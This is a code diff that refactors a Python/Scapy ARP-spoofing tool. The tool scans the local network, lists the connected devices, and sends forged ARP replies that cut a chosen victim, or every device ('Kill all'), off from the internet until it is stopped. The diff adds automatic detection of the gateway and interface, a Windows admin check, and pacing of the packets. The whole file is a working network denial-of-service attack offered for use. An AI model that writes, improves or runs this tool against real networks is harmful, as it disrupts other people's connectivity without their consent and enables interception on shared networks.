@@ -8,84 +8,111 @@ It must be run as root (sudo) in order to send the required packets.
 """
 
 import os
-import socket
 import logging
 import time
+import ipaddress
+import netifaces
 from scapy.all import arping, ARP, send, conf, get_if_hwaddr
 
 # Silence Scapy warnings
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 conf.verb = 0
 
-def get_ip_macs(ips):
-    """
-    Returns a list of tuples (ip, mac) of all computers on the network.
-    """
-    answers, _ = arping(ips, verbose=0)
-    res = []
-    for sent, received in answers:
-        res.append((received.psrc, received.hwsrc))
-    return res
+
+def get_ip_macs(ips, iface, timeout=2):
+    """Return a list of ``(ip, mac)`` tuples for devices on the network."""
+    answers, _ = arping(ips, iface=iface, timeout=timeout, verbose=0)
+    return [(r.psrc, r.hwsrc) for _, r in answers]
+
 
 def poison(victim_ip, victim_mac, gateway_ip, src_mac):
-    """
-    Send the victim an ARP packet pairing the gateway IP with a wrong MAC
-    (src_mac), effectively cutting its route to the router.
-    """
-    pkt = ARP(op=2,
-              psrc=gateway_ip,
-              hwsrc=src_mac,
-              pdst=victim_ip,
-              hwdst=victim_mac)
+    """Send ARP packet associating ``gateway_ip`` with ``src_mac``."""
+    pkt = ARP(
+        op=2,
+        psrc=gateway_ip,
+        hwsrc=src_mac,
+        pdst=victim_ip,
+        hwdst=victim_mac,
+    )
     send(pkt, verbose=0)
+
 
 def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
-    """
-    Send the victim an ARP packet pairing the gateway IP with the correct MAC,
-    restoring normal connectivity.
-    """
-    pkt = ARP(op=2,
-              psrc=gateway_ip,
-              hwsrc=gateway_mac,
-              pdst=victim_ip,
-              hwdst=victim_mac)
+    """Send ARP packet pairing ``gateway_ip`` with ``gateway_mac``."""
+    pkt = ARP(
+        op=2,
+        psrc=gateway_ip,
+        hwsrc=gateway_mac,
+        pdst=victim_ip,
+        hwdst=victim_mac,
+    )
     send(pkt, verbose=0)
 
-def get_lan_ip():
-    """
-    Obtains the current LAN IP address by opening a UDP socket to the internet.
-    """
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8", 80))
-    ip = s.getsockname()[0]
-    s.close()
-    return ip
 
 def print_divider():
     print('-' * 40)
 
-def main():
-    # must be root
-    if os.geteuid() != 0:
-        print("You need to run the script as root/sudo.")
-        return
 
-    # determine your interface MAC to use as spoof source
+def get_network_params():
+    """Return interface, scan range and gateway IP."""
     iface = conf.iface
+    gws = netifaces.gateways().get('default', {})
+    gw = gws.get(netifaces.AF_INET)
+    if gw:
+        gateway_ip, iface = gw
+
+    addrs = netifaces.ifaddresses(iface).get(netifaces.AF_INET)
+    if not addrs:
+        raise SystemExit(f"No IPv4 address found on interface {iface}")
+
+    addr = addrs[0]['addr']
+    mask = addrs[0].get('netmask', '255.255.255.0')
+    network = ipaddress.IPv4Network(f"{addr}/{mask}", strict=False)
+    ip_range = str(network)
+
+    if not gw:
+        gateway_ip = str(next(network.hosts()))
+
+    return iface, ip_range, gateway_ip
+
+
+def is_admin():
+    """Return ``True`` if the script is running with administrative rights."""
+    if os.name != "nt":
+        return os.geteuid() == 0
+
+    try:
+        import ctypes  # imported only on Windows
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except Exception:
+        return False
+
+
+def check_root():
+    """Exit the script if not executed with administrator privileges."""
+    if not is_admin():
+        raise SystemExit(
+            "You need to run the script as root/sudo or with Administrator "
+            "privileges."
+        )
+
+
+def main():
+    check_root()
+
+    # detect network parameters and our MAC address
+    iface, ip_range, gateway_ip = get_network_params()
     src_mac = get_if_hwaddr(iface)
+
+    print(f"Using interface {iface} with scan range {ip_range}")
+    print_divider()
 
     refreshing = True
     gateway_mac = None
 
     while refreshing:
-        # build IP range and gateway IP
-        my_ip = get_lan_ip()
-        octets = my_ip.split('.')
-        gateway_ip = '.'.join(octets[:3] + ['1'])
-        ip_range = '.'.join(octets[:3] + ['0/24'])
-
         # discover devices
-        devices = get_ip_macs(ip_range)
+        devices = get_ip_macs(ip_range, iface, timeout=4)
 
         print_divider()
         print("Connected devices:")
@@ -106,13 +133,11 @@ def main():
         print("(r) Refresh, (a) Kill all, (q) Quit")
 
         choice = None
-        kill_all = False
         while True:
             cmd = input("> ").strip().lower()
             if cmd == 'r':
                 break
             if cmd == 'a':
-                kill_all = True
                 choice = 'a'
                 refreshing = False
                 break
@@ -131,12 +156,17 @@ def main():
             while True:
                 for ip, mac in devices:
                     poison(ip, mac, gateway_ip, src_mac)
+                time.sleep(2)
 
         else:
             victim_ip, victim_mac = devices[choice]
-            print(f"Preventing {victim_ip} from accessing the internet... (Ctrl+C to stop)")
+            print(
+                f"Preventing {victim_ip} from accessing the internet... "
+                "(Ctrl+C to stop)"
+            )
             while True:
                 poison(victim_ip, victim_mac, gateway_ip, src_mac)
+                time.sleep(2)
 
     except KeyboardInterrupt:
         print("\nRestoring ARP tables...")
@@ -148,6 +178,7 @@ def main():
             if gateway_mac:
                 restore(victim_ip, victim_mac, gateway_ip, gateway_mac)
         print("Done. You're welcome!")
+
 
 if __name__ == "__main__":
     main()
